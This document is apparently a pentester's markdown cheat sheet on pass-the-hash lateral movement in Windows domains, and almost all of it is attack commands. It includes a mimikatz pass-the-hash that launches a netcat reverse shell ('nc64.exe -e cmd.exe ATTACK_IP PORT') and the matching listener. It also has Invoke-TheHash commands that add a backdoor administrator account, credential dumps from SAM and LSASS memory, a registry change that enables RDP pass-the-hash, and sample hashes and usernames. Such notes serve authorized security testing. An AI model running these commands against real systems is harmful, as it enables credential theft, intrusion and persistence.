# Pass-the-Hash Lateral Movement 

## Tools: impacket , psexec , crackmapexec/netexec , evil-winrm , xfreerdp/remmina , smbclient , mimikatz

## Globally, all the Impacket tools and the ones that use the library can authenticate via Pass The Hash with the -hashes command line parameter instead of specifying the password. For ldeep, NetExec and evil-winrm, it's -H.

# Interactive shell

#### 1) mimikatz

    mimikatz "privilege::debug sekurlsa::pth /user USER /domain:DOMAIN /ntlm:HASH /run:"C\tools\nc64.exe -e cmd.exe ATTACK_IP PORT"

#### 2) psexec (Impacket and Windows)

    psexec.exe -AcceptEULA \\IP

    impacket-psexec -hashes":HASH" USER@IP

#### 3) Empire C2

    usemodule lateral_movement/invoke_smbexec

##### Parameters

    (Empire: usemodule/powershell/lateral_movement/invoke_smbexec) > set ComputerName '10.10.10.100'
    (Empire: usemodule/powershell/lateral_movement/invoke_smbexec) > set Domain security.local
    (Empire: usemodule/powershell/lateral_movement/invoke_smbexec) > set Listener http
    (Empire: usemodule/powershell/lateral_movement/invoke_smbexec) > set Hash 58a478135a93ac3bf058a5ea0e8fdb71
    (Empire: usemodule/powershell/lateral_movement/invoke_smbexec) > set Username moe
    (Empire: usemodule/powershell/lateral_movement/invoke_smbexec) > execute

#### 4) Metasploit

    use exploit/windows/smb/psexec

##### Set hash as password

    set smbpass "aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71"

#### 5) Invoke-TheHash

# SMB Options

##### Check SMB signing

    Invoke-TheHash -Type SMBExec -Target '[IP]'
    Invoke-TheHash -Type SMBExec -Target [CIDR]

##### Check for command execution 

    Invoke-TheHash -Type SMBExec -Username [Username]@[Domain] -Hash '[NTLM-Hash]' -Target '[IP]'
    Invoke-TheHash -Type SMBExec -Username [Username]@[Domain] -Hash '[NTLM-Hash]' -Target [CIDR]

##### Pass hash to target and execute specified command 

    Invoke-TheHash -Type SMBExec -Command "net user /add Pentest Password123 && netlocal group Administrators /add Pentest" -Username [Username]@[Domain] -Hash '[NTLM-Hash]' -Target '[IP]' 
    Invoke-TheHash -Type SMBExec -Command "net user /add Pentest Password123 && netlocal group Administrators /add Pentest" -Username [Username]@[Domain] -Hash '[NTLM-Hash]' -Target [CIDR]

 ##### Enumerate SMB Shares / Users / Net Sessions 

    Invoke-SMBEnum -Username [Username]@[Domain] -Hash '[NTLM-Hash]' -Target '[IP]'
    Invoke-SMBEnum -Username [Username]@[Domain] -Hash '[NTLM-Hash]' -Target [CIDR]

# WMI Options
##### Check for command execution (WMI)

    Invoke-TheHash -Type WMIExec -Username '[Username]' -Hash '[NTLM-Hash]' -Target '[IP]'
    Invoke-TheHash -Type WMIExec -Username '[Username]' -Hash '[NTLM-Hash]' -Target [CIDR]

##### Pass hash to target and execute specified command (WMI)
    
    Invoke-TheHash -Type WMIExec -Command "net user /add Pentest Password123 && netlocal group Administrators /add Pentest" -Username [Username]@[Domain] -Hash '[NTLM-Hash]' -Target '[IP]'
    Invoke-TheHash -Type WMIExec -Command "net user /add Pentest Password123 && netlocal group Administrators /add Pentest" -Username [Username]@[Domain] -Hash '[NTLM-Hash]' -Target [CIDR]

#### 6) Mimikatz

    Invoke-Mimikatz -Command '"sekurlsa::pth /user:<User> /domain:<Domain> /ntlm:<NTLM> /run:powershell.exe"'
    Invoke-Mimikatz -Command '"sekurlsa::pth /user:Moe /domain:Security.local /ntlm:58a478135a93ac3bf058a5ea0e8fdb71 /run:powershell.exe"'

## TIP: Both of these techniques give NT Authority/System shell (System/Admin access)

# Pseudo-shell (File write and read) (System/Admin access)

#### 1) crackmapexec/netexec

    netexec smb IP_RANGE -u USER -d DOMAIN -H ':HASH'

    netexec smb IP_RANGE -u USER -H ':HASH' --local-auth

#### 2) Impacket Library

    atexec.py -hashes ":HASH" USER@IP "COMMAND"

    smbexec.py -hashes ":HASH" USER@IP

## These techniques give NT Authority/System shell

    wmiexec.py -hashes ":HASH" USER@IP

    dcomexec.py -hashes ":HASH" USER@IP

# WinRM 

#### 1) evil-winrm

    evil-winrm -i IP -u USER -H HASH

# SMB

#### 1) smbclient

    smbclient.py -hashes ":HASH" USER@IP (Authenticate, then search files)
    smbclient //<IP>/<Share> -U <User> --pw-nt-hash <Hash> -W <Domain>
    smbclient '//10.0.0.100/IT' -U 'moe' --pw-nt-hash '58a478135a93ac3bf058a5ea0e8fdb71' -W 'security.local'

# RDP

#### 1) reg.py and xfreerdp/remmina

    reg.py DOMAIN/USER@IP -hashes ':HASH' add -keyName 'HKLM\System\CurrentControlSet\Control\Lsa' -v 'DisabledRestrictedAdmin' -vt 'REG_DWORD' -vd '0'

    xfreerdp /u:USER /d:DOMAIN /pth:HASH /v:IP

# MSSQL

#### 1) crackmapexec/netexec

    netexec mssql IP_RANGE -H ':HASH'

#### 2) mssqlclient.py

    mssqlclient.py -windows-auth -hashes ":HASH" DOMAIN/USER@IP

# EXTRACT NTLM HASHES FROM LOCAL SAM

### 

    privilege::debug

### 

    token::elevate

### 

    lsadump::sam -> LOCAL SAM DUMP

### 

    sekurlsa::msv -> LSASS MEMORY DUMP

### 

    token::revert

### 

    sekurlsa::pth /user:USER.USER /domain:DOMAIN /ntlm:NTLM_HASH /run:"C\tools\nc64.exe -e cmd.exe ATTACK_IP PORT" 

### 

    nc -lvp PORT

# PtH (Linux)

### 

    xfreerdp /v:VICTIM_IP /u:DOMAIN\USER /pth NTLM_HASH

### 

    psexec.py -hashes NTLM_HASH DOMAIN\USER@VICTIM_IP

### 

    evil-winrm -i VICTIM_IP -u USER -H NTLM_HASH

